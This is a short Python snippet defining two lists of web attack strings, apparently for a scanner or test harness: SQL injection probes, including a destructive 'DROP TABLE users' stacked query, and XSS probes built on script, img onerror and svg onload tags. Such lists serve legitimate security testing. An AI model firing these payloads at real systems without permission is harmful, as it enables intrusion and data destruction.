sql_payloads = [
    "1' OR '1'='1",
    "1'--",
    "' OR '1'='1' --",
    "1; DROP TABLE users; --",
    "\" OR 1=1 --",
    "' OR 1=1#"
]

xss_payloads = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]
